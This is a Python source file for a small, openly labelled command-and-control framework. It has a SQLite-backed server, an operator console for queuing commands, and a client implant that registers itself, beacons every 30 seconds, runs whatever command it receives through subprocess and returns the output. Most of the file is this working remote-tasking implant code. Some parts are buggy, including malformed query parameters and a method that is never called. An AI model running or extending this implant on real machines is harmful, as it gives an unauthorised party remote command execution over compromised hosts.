#! env python
from select import select
import sqlite3
from ipaddress import ip_address
import subprocess
import types
import socket
import logging
import uuid
import json
import selectors
from pathlib import Path
import datetime
import time
import subprocess
import argparse

logger = logging.getLogger(__name__)

DEFAULT_DB_PATH = Path("./pyC2.sqlite")
CREATE_ENDPOINT_TABLE_SQL = """ CREATE TABLE IF NOT EXISTS endpoints (
                                id integer PRIMARY KEY,
                                uuid text NOT NULL,
                                hostname text NOT NULL,
                                first_callback integer NOT NULL,
                                last_callback integer NOT NULL,
                                last_ip text NOT NULL
                            )"""

CREATE_TASKING_TABLE_SQL =  """ CREATE TABLE IF NOT EXISTS tasking (
                                id integer PRIMARY KEY,
                                endpoint text NOT NULL,
                                uuid text NOT NULL,
                                task text NOT NULL,
                                results text,
                                created text NOT NULL,
                                updated text
                            )"""

"""
# JSON schema for inbound messages to C2 server:
{
    "type": "operator or client, should be obfuscated to 0 or 1 eventually",
    "action: "operator -> C2: list_clients, put_tasking, list_tasking, or query_tasking.  If client -> C2: register_endpoint, get_tasks, put_results.  shorten to op_id",
    "endpoint_id": "uuid",
    "tasking": [
        {
            "task_id": "for operator -> C2 query_tasking or client -> C2 put_results",
            "task_type": "operator -> C2. something like hostname, ip, get_file, etc.",
            "args": "operator -> C2. and command arguments like path, ip, etc.",
            "results": "client -> C2 only",
        }
        {
            "task_id": "second task if there is one",
            etc. etc.
        }
    ]
    "info": {
        "ip": "source IP of client registering",
        "hostname": "hostname of client",
    }



}

# JSON schema for outbound messages from C2 server:
{
    "action": "if C2 -> operator: list_clients_response, put_tasking_response, list_tasking_response, or query_tasking_response.  
                If C2 -> client: register_endpoint_response, get_tasks_response, put_results_response.  shorten to op_id",
    "response": [
        {
            "clients_list": [list of clients]
            "endpoint_id": "new endpoint ID for client"
            "task_id": "ID to reference when sending response.  UUID would be best",
            "task_type": "C2 -> client only: something like hostname, ip, get_file, etc.",
            "args": "C2 -> client only: command arguments like path, ip, etc.",
            "results": "C2 -> operator only",
        }
    "
    ]



}

"""
def pause_for_any_key():
    _ = input("Press any key to continue")

def get_ip_addr():
    return socket.gethostbyname(socket.gethostname())


class C2Client:
    def __init__(self, 
            dest_ip: ip_address, 
            dest_port: int, 
            c2_method: str, 
            endpoint_id: uuid = None,
            sleep: int = 30,
            src_ip: str = get_ip_addr(),
            hostname: str = socket.gethostname()
            ):
        logger.debug(src_ip)
        self.dest_ip = dest_ip
        self.dest_port = dest_port
        self.c2_method = c2_method
        self.endpoint_id = endpoint_id
        self.sleep = sleep
        self.src_ip = src_ip
        self.hostname = hostname
        self.tasking_queue = []

    def c2_server_transaction(self, server_message) -> json:
        # send message to c2 server with one of the pre-defined actions
        # register_endpoint, get_tasks, put_results
        logger.info(f"Starting connection to {self.dest_ip}:{self.dest_port}")
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            received_data = b""
            sock.connect((self.dest_ip,self.dest_port))    
            sock.sendall(json.dumps(server_message).encode())
            data = sock.recv(4096)
            received_data += data
            logger.debug(data)
        response_decoded = json.loads(received_data.decode())
        logger.debug(f"Closing connection to {self.dest_ip}:{self.dest_port}")
        return response_decoded

    
    def register_endpoint(self):
        # reach out to C2 server and get an endpoint UUID
        request = {}
        request["type"] = "client"
        request["action"] = "register_endpoint"
        request["info"] = {"ip":str(self.src_ip), "hostname": self.hostname}
        logger.debug(f"ip looks like this before going into json: {self.src_ip} then str formatted: {str(self.src_ip)}")
        logger.debug(f"request info addr looks like this: {request['info']}")
        logger.debug(f"request ip addr looks like this: {request['info']['ip']}")
        logger.debug(f"type: {type(request['info']['ip'])}")
        self.endpoint_id = self.c2_server_transaction(server_message=request)["response"]["endpoint_id"]
        logger.info(f"registered as {self.endpoint_id}")

    def get_tasks(self) -> list:
        # reach out to C2 server and get tasking, then process it and update results
        request = {}
        request["type"] = "client"
        request["action"] = "get_tasks"
        request["endpoint_id"] = self.endpoint_id
        new_tasks = self.c2_server_transaction(server_message=request)
        if len(new_tasks) > 0:
            self.tasking_queue = [new_tasks["response"][0]]
        else: self.tasking_queue = []

    
    def update_tasking(self):
        # reach out to C2 server and update results for task ID
        request = {}
        request["type"] = "client"
        request["action"] = "put_results"
        request["endpoint_id"] = self.endpoint_id
        request["tasking"] = [{"task_id": task[0], "results": task[2]} for task in self.tasking_queue]
        self.c2_server_transaction(server_message=request)
        self.tasking_queue = []

    def process_tasking(self, task: str) -> str:
        # yep this is super wonky and prone to huge vulnerabilities and errors.  just a demo
        logger.debug(f"Running {task}")
        results = subprocess.check_output(task).decode().strip()
        return results


    def run(self):
        # loop through callback -> sleep cycle
        shutdown = False

        logger.debug(self.src_ip)

        while not shutdown:
            if not self.endpoint_id:
                self.register_endpoint()
            logger.debug(f"tasking queue: {self.tasking_queue}")
            for index, row in enumerate(self.tasking_queue):
                logger.debug(f"tasking: {row}")
                task = row[1].strip('"')
                task_id = row[0]
                results = self.process_tasking(task)
                self.tasking_queue[index].append(results)
            logger.debug(f"updated tasking queue: {self.tasking_queue}")
            self.update_tasking()
            time.sleep(self.sleep)
            self.get_tasks()


class C2Database:
    def __init__(self, file_path: str):
        self.file_path = file_path
        try:
            self.conn = sqlite3.connect(file_path)
            self.db_cursor = self.conn.cursor()
            self.db_cursor.execute(CREATE_ENDPOINT_TABLE_SQL)
            self.db_cursor.execute(CREATE_TASKING_TABLE_SQL)

        except sqlite3.Error as e:
            logger.error(e)

    def add_tasking(self, endpoint: uuid, tasking: json) -> str:
        # add tasking to db
        # return task ID
        new_task_id = str(uuid.uuid4())
        created_date = str(datetime.datetime.now().isoformat())
        query = '''INSERT INTO tasking(uuid,endpoint,task,created) 
                    Values(?,?,?,?) '''
        self.db_cursor.execute(query,(new_task_id, str(endpoint), json.dumps(tasking), created_date))
        self.conn.commit()
        return new_task_id

    def add_results(self, task_id: str, task_results: str):
        # update task ID with success/fail status and results
        query = '''UPDATE tasking 
                    SET results = ? 
                    WHERE uuid = ?'''
        self.db_cursor.execute(query, (task_results, task_id))
        self.conn.commit()

    def query_tasking(self, endpoint: uuid, filter: dict = {}) -> list:
        # pull tasking results from db with option to filter
        # returns list of tasking rows
        if filter.get("id", False):
            query = '''SELECT * FROM tasking WHERE uuid = ?'''
            data = (filter["id"])
        elif filter.get("new_tasks", False):
            query = '''SELECT uuid, task FROM tasking WHERE endpoint = ? and results IS NULL'''
            data = (str(endpoint),)
            logger.debug(str(endpoint))
        else:
            query = '''SELECT * FROM tasking WHERE endpoint = ?'''
            data = (str(endpoint))
        self.db_cursor.execute(query, data)
        return(self.db_cursor.fetchall())

    def clear_tasking(self, task_id: str):
        # remove rows from tasking db
        # not yet implemented, not sure how I want to age off entries
        query = '''DELETE FROM tasking where uuid = ?'''
        logger.info(f"deleting task id: {task_id}")
        self.db_cursor(query, (task_id))

    def register_endpoint(self, hostname: str, last_ip: str) -> str:
        # add new endpoint, give it a UUID, add to endpoints table
        # returns UUID (uuid.uuid4())
        new_uuid = str(uuid.uuid4())
        first_callback = str(datetime.datetime.now().isoformat())
        last_callback = first_callback
        query = '''INSERT INTO endpoints(uuid,hostname,first_callback,last_callback,last_ip) Values(?,?,?,?,?)'''
        data = (new_uuid, hostname, first_callback, last_callback, last_ip)
        self.db_cursor.execute(query, data)
        self.conn.commit()
        return new_uuid

    def remove_endpoint(self, endpoint: uuid):
        # remove endpoint from db
        # not yet implemented
        query = '''DELETE FROM endpoints where uuid = ?'''
        data = (str(endpoint))
        self.db_cursor.execute(query, data)

    def list_endpoints(self) -> list:
        # list all active endpoints
        query = "SELECT uuid from endpoints;"
        self.db_cursor.execute(query)
        endpoints = self.db_cursor.fetchall()
        logger.debug(endpoints)
        return endpoints



class C2Operator:
    def __init__(
            self,
            c2_method: str,
            port: int,
            server: ip_address,
            ):
        self.c2_method = c2_method
        self.port = port
        self.server = server
        self.active_client = None
        self.client_list = []
    
    def run_console(self):
        shutdown = False
        while not shutdown:
            action = self.prompt_user_input()
            if action == 5:
                shutdown = True
            elif action == 1:
                self.list_clients()
                pause_for_any_key()
            elif action == 2:
                self.select_client()
            elif action == 3:
                self.query_client_tasking
                pause_for_any_key()
            elif action == 4:
                self.submit_tasking()
            else:
                pass

    def list_clients(self):
        # prompt for clients from C2 server, store in class instance
        request = {}
        request["type"] = "operator"
        request["action"] = "list_clients"
        self.clients_list = self.c2_server_transaction(server_message=request)["response"]
        for client in self.clients_list:
            print(f"client UUID: {client[0]}")
        
    def select_client(self):
        # dump latest list of clients and have user select number
        valid_selection = False
        while not valid_selection:
            print("### Client List ###")
            for index, client in enumerate(self.clients_list):
                print(f"{index + 1}:\t{client[0]}")
            print("###################")
            try:
                selection = int(input("Select a client, or 0 to exit: "))
                if selection > 0 and selection <=len(self.clients_list):
                    self.active_client = self.clients_list[selection - 1][0]
                    print(f"selected {self.active_client}")
                    valid_selection = True
                elif selection == 0:
                    valid_selection = True
            except ValueError:
                continue
    
    def query_client_tasking(self):
        # pull tasking queue for active client
        request = {}
        request["type"] = "operator"
        request["action"] = "query_tasking"
        request["endpoint_id"] = self.active_client
        client_tasking = self.c2_server_transaction(server_message = request)
        
        print(f"Tasking for endpoint {self.active_client}:\n")
        for task in client_tasking:
            print(f"{task}\n")
    
    def submit_tasking(self):
        # submit tasking, which right now is just a cmd to go to the terminal
        request = {}
        request["type"] = "operator"
        request["action"] = "put_tasking"
        request["endpoint_id"] = self.active_client
        request["tasking"] = []
        request["tasking"].append(input("Enter tasking line:"))
        task_id = self.c2_server_transaction(server_message = request)
        print(f"Task id: {task_id}")



    def prompt_user_input(self) -> str:
        # ask user to select from actions to take
        menu = """Select option:\n
            1) list clients\n
            2) select client\n
            3) query client tasking\n
            4) submit tasking\n
            5) quit\n
            Choice: """
        
        while True:
            try:
                choice = int(input(menu))
                if choice in [1,2,3,4,5]:
                    return choice
            except ValueError:
                continue
    
    def c2_server_transaction(self, server_message) -> json:
        # send message to c2 server with one of the pre-defined actions
        # put_tasking, list_tasking, query_tasking
        logger.info(f"Starting connection to {self.server}:{self.port}")
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            received_data = b""
            sock.connect((self.server,self.port))    
            sock.sendall(json.dumps(server_message).encode())
            data = sock.recv(4096)
            logger.debug(data)
        response_decoded = json.loads(data.decode())
        logger.debug(f"Closing connection to {self.server}:{self.port}")
        return response_decoded
                

class C2Server:
    def __init__(
            self, 
            c2_method: str, 
            operator_port: int, 
            callback_port: int, 
            operator_listen_ip: ip_address, 
            callback_listen_ip: ip_address, 
            tasking_log = None,
            client_db_path: Path = DEFAULT_DB_PATH,
        ):
        self.c2_method = c2_method
        self.db_conn = C2Database(file_path=client_db_path)
        self.operator_port = operator_port
        self.callback_port = callback_port
        self.operator_listen_ip = operator_listen_ip
        self.callback_listen_ip = callback_listen_ip

    def run(self):
        # loop looking for callbacks from client and tasking from operator        
        # set up listener sockets and register them with the selector
        sel = selectors.DefaultSelector()
        ops_sock = self.set_up_listener(self.operator_listen_ip, self.operator_port)
        sel.register(ops_sock, selectors.EVENT_READ, data=None)
        client_sock = self.set_up_listener(self.callback_listen_ip, self.callback_port)
        sel.register(client_sock, selectors.EVENT_READ, data=None)

        try:
            shut_down = False
            while not shut_down:
                # return tuple of events from registered sockets
                events = sel.select(timeout=None)
                for key, mask in events:
                    if key.data is None:
                        self.accept_wrapper(key.fileobj, sel)
                    else:
                        shut_down = self.service_connection(key, mask, sel)
                        
        except KeyboardInterrupt:
            logger.error("Received keyboard interrupt, exiting")
        finally:
            sel.close()


    def accept_wrapper(self, sock: socket, sel: selectors.DefaultSelector):
        # accept the inbound connection
        conn, addr = sock.accept()
        logger.info(f"Received connection from {addr}")
        # turn off blocking so we don't hang
        conn.setblocking(False)
        # prepare to register this socket with the selector for servicing
        data = types.SimpleNamespace(addr=addr, inb=b"", outb=b"")
        # we want to register this socket to use when its ready for reading and writing
        # Not sure why bitwise OR works for this purpose
        events = selectors.EVENT_READ | selectors.EVENT_WRITE
        sel.register(conn, events, data=data)

    def service_connection(self, key, mask, sel):
        # this is where we read the socket after it's been accepted
        # this lets us pass tasking/querying/actions to/from the client connection

        sock = key.fileobj
        data = key.data
        #logger.debug(data)
        #logger.debug("running service_connection")
        inbound_data = ""
        data_buffer = ""
        if mask & selectors.EVENT_READ:
            # read until we get everything
            data_buffer = sock.recv(1024)
            # logger.debug(data_buffer)
            if data_buffer:
                data.outb += data_buffer
            else:
                # process what we read and prepare response
                logger.info(f"Closing connection to {data.addr}")
                sel.unregister(sock)
                sock.close()

        if mask & selectors.EVENT_WRITE:
            if data.outb:
                inbound_data = data.outb.decode()
                logger.debug(f"processing {inbound_data}")
                inbound_message = json.loads(inbound_data)
                response = self.process_tasking(inbound_message).encode()
                sock.send(response)
                data.outb = None
                

    def set_up_listener(self, host: ip_address, port: int) -> socket.socket:
        # bind sockets for listeners (either operator or callback)
        # return socket object
        sel = selectors.DefaultSelector()

        lsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        lsock.bind((host, port))
        lsock.listen()
        logger.info(f"Listening on {(host, port)}")
        lsock.setblocking(False)
        return lsock

    
    def process_tasking(self, message: json) -> json:
        # parse input json, act on it, and prepare response message
        # get action, type, endpoint, tasking 
        
        # can be client or operator
        message_type = message["type"]
        
        # can be:
        #  operator: put_tasking, list_tasking, query_tasking, list_endpoints
        #  client: register_endpoint, get_tasks, put_results, 
        action = message["action"]
        endpoint_id = message.get("endpoint_id", None)
        response = {"action":None, "response": {}}

        # these actions should really be defined in a YAML somewhere.  If this module grows this part can get unwieldy

        # loop through tasking entries, probably just doing one at a time right now:
        if message_type == "operator" and action == "put_tasking":
            response["action"] = "put_tasking_response"
            # only one item right now so it's okay to overwrite task_id
            for task in message["tasking"]:
                response["response"]["task_id"] = self.db_conn.add_tasking(endpoint_id, task)
        elif message_type == "operator" and action == "list_tasking":
            response["action"] = "list_tasking_response"
            response["response"] = self.db_conn.query_tasking(endpoint=endpoint_id)
        elif message_type == "operator" and action == "query_tasking":
            # task_id = message["tasking"]["task_id"]
            response["action"] = "query_tasking_response"
            #response["response"] = self.db_conn.query_tasking(endpoint=endpoint_id, filter={"id":task_id})
            response["response"] = self.db_conn.query_tasking(endpoint=endpoint_id)
        elif message_type == "operator" and action == "list_clients":
            response["action"] = "list_clients_response"
            response["response"] = self.db_conn.list_endpoints()
        elif message_type == "client" and action == "register_endpoint":
            src_ip = message["info"]["ip"]
            hostname = message["info"]["hostname"]
            response["action"] = "register_endpoint_response"
            response["response"]["endpoint_id"] =  self.db_conn.register_endpoint(hostname=hostname, last_ip=src_ip)
            logger.debug(f"registered endpoint IP: {src_ip}")
        elif message_type == "client" and action == "get_tasks":
            response["action"] = "get_tasks_response"
            new_tasks = self.db_conn.query_tasking(endpoint=endpoint_id, filter={"new_tasks": True})
            response["response"] = new_tasks
        elif message_type == "client" and action == "put_results":
            response["action"] = "put_results_response"
            for task in message["tasking"]:
                task_id = task["task_id"]
                task_results = task["results"]
                self.db_conn.add_results(task_id=task_id, task_results=task_results)
            # theres' a better way to handle this if we don't need to respond
            response["response"] = "received"
        return(json.dumps(response))


def main():
    #logging.basicConfig(filename='c2log.log', level=logging.INFO)
    
    #parse cmdline arguments
    parser = argparse.ArgumentParser(
        description='C2 script, runs as either client, server, or operator')
    parser.add_argument('--debug', dest='debug',
                              default=False, action='store_true',
                              help='enable debug mode')
    parser.add_argument('--mode', type=str, dest='mode',  default=False, choices=("server", "client", "operator"))
    parser.add_argument('--server_ip', dest='server_ip', default=False, help='dest IP for C2 server')
    parser.add_argument('--callback_port', dest='callback_port', type=int, required=True, help='dest port for client callbacks to C2 server')
    parser.add_argument('--operator_port', dest='operator_port', type=int, required=True, help='dest port for operator comms')
    parser.add_argument('--db_file', dest='db_file', type=str, help='file path for sqlite db', default=DEFAULT_DB_PATH)
    parser.add_argument('--log_file', dest='log_file', type=str, help='location of log file output', default='c2_log.log')
    args = parser.parse_args()

    if args.debug:
        logging.basicConfig(level=logging.DEBUG)
        logger.setLevel(logging.DEBUG)
        logger.debug(get_ip_addr())
    
    logger.debug(args)

    if args.mode == 'server':
        server = C2Server(
            c2_method=None,
            operator_port=args.operator_port,
            callback_port=args.callback_port,
            operator_listen_ip=args.server_ip,
            callback_listen_ip=args.server_ip,
            tasking_log=args.log_file,
            client_db_path=args.db_file,
            )
        server.run()
    elif args.mode == 'client':
        client = C2Client(
            src_ip=get_ip_addr(),
            dest_ip=args.server_ip,
            dest_port=args.callback_port,
            c2_method=None,
            sleep=30,
            )
        client.run()
    else:
        operator = C2Operator(c2_method=None, port=args.operator_port, server=args.server_ip)
        operator.run_console()


if __name__ == "__main__":
    main()
